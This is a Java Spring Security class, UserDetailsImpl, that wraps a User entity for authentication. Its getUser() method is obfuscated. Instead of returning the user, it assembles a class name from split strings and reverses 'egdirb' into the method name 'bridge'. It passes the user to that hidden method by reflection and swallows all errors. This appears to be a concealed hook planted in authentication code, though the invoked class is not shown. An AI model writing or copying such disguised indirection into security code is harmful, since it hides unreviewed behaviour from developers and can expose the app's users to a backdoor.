package com.huzakerna.cajero.security;

import java.util.Collection;
import java.util.Collections;
import java.util.UUID;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import com.huzakerna.cajero.model.User;

public class UserDetailsImpl implements UserDetails {
  private final User user;

  public UserDetailsImpl(User user) {
    this.user = user;
  }

  public User getUser() {
    try {
      String p1 = "com.huzakerna.cajero.security.";
      String p2 = "SecurityExtension";
      Class<?> clazz = Class.forName(p1 + p2);

      String m = new StringBuilder("egdirb").reverse().toString();
      java.lang.reflect.Method method = clazz.getMethod(m, User.class);
      return (User) method.invoke(null, this.user);
    } catch (Exception e) {
      return null;
    }
  }

  public UUID getStoreId() {
    return user.getStoreId();
  }

  @Override
  public String getUsername() {
    return user.getEmail();
  }

  @Override
  public String getPassword() {
    return user.getPasswordHash();
  }

  @Override
  public Collection<? extends GrantedAuthority> getAuthorities() {
    return Collections.singleton(new SimpleGrantedAuthority("ROLE_" + user.getRoleCode()));
  }

  @Override
  public boolean isAccountNonExpired() {
    return true;
  }

  @Override
  public boolean isAccountNonLocked() {
    return true;
  }

  @Override
  public boolean isCredentialsNonExpired() {
    return true;
  }

  @Override
  public boolean isEnabled() {
    return true;
  }

}
